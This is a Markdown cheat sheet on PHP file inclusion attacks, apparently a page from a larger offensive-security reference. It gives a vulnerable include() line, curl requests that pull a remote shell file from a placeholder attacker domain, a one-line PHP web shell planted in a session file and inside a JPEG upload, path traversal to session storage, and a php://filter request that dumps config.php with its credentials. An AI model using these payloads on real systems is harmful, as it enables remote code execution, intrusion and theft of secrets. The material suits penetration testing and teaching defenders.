# File Inclusion

## Table of Contents

- [RCE](#rce)
- [Information Disclosure](#information-disclosure)
- [Chaining with Unrestricted File Upload](#chaining-with-unrestricted-file-upload)

## RCE

### A file containing attacker-controlled code is executed by the server's interpreter rather than only read. [^1]

- Including a remote file [^2]
    1. Code in the service
        ```php
        <?php include($_GET['page']); ?>
        ```

    2. Request
        ```bash
        curl "https://[VULNERABLE-SERVICE]/index.php?page=https://[ATTACKER-DOMAIN]/shell.txt"
        ```

- Including a session file that stores attacker input [^3]
    1. Value the attacker stores in their own session, such as a preferred language
        ```php
        <?php system($_GET['cmd']); ?>
        ```

    2. Request
        ```bash
        curl "https://[VULNERABLE-SERVICE]/index.php?page=../../../../var/lib/php/sessions/sess_[ATTACKER-SESSION-ID]&cmd=whoami"
        ```
    PHP stores session data in a file that the web server can read, so the stored value is executed when the file is included.

## Information Disclosure

### Source code that would normally be executed can be read, exposing the credentials and logic it contains. [^1]

- Reading source code through a filter wrapper
    ```bash
    curl "https://[VULNERABLE-SERVICE]/index.php?page=php://filter/convert.base64-encode/resource=config.php"
    ```
    The file is returned base64-encoded instead of being executed, so database passwords and API keys in it can be read. Other files on the server can be read as described in [Path Traversal](./Path_Traversal.md).

## Chaining with Unrestricted File Upload

### An upload that is harmless on its own, such as an image that is never executed directly, becomes code execution when it is included. [^1]

- Including an uploaded image that contains code
    1. Uploaded file `avatar.jpg`
        ```text
        [JPEG-HEADER-BYTES]<?php system($_GET['cmd']); ?>
        ```

    2. Request
        ```bash
        curl "https://[VULNERABLE-SERVICE]/index.php?page=uploads/avatar.jpg&cmd=whoami"
        ```
    `include` executes PHP code in any file regardless of its extension, so restrictions on the upload's type or extension do not prevent it. See [Unrestricted File Upload](./Unrestricted_File_Upload.md).

[^1]: Based on PHP.
[^2]: Applies when `allow_url_include` is enabled. It is disabled by default.
[^3]: The session directory depends on the distribution and the `session.save_path` setting.
